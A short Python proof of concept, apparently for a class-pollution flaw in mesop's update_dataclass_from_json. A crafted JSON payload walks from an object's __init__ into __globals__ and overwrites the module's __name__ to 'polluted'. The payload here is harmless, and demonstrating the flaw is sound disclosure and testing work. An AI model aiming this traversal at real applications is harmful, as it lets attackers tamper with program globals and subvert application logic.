from mesop.dataclass_utils.dataclass_utils import update_dataclass_from_json

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age

obj = Animal('cat', 11)

try:
    update_dataclass_from_json(obj, '{"__init__": {"__globals__": {"__name__": "polluted"}}}')
except:
    pass

print(__name__)